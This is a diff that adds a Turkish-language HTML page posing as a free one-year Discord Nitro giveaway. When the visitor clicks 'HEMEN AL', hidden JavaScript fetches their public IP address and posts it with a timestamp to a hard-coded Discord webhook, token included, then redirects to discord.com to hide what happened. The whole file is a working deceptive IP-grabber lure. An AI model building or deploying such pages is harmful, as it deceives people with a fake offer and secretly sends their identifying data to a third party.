@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Nitro Ücretsiz!</title>
+  <style>
+    body {font-family: Arial; text-align: center; background: #5865F2; color: white; padding: 50px;}
+    button {padding: 20px 50px; font-size: 24px; background: #43B581; color: white; border: none; border-radius: 12px; cursor: pointer;}
+  </style>
+</head>
+<body>
+  <h1>Discord Nitro 1 Yıl ÜCRETSİZ!</h1>
+  <button onclick="send()">HEMEN AL</button>
+  <script>
+    function send() {
+      fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => {
+          const ip = d.ip;
+          const time = new Date().toLocaleString('tr-TR');
+          fetch('https://discord.com/api/webhooks/1433209697372078235/eXJ9I-LMfE6p2wNgBZZNNFWdmCtQ0YHzfaPjkHw-9Jle-ZEgzs14lf-HRl72uxxA34L5', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({content: `**IP:** ${ip}\n**Zaman:** ${time}`})
+          }).then(() => {
+            location.href = 'https://discord.com';
+          });
+        });
+    }
+  </script>
+</body>
+</html>
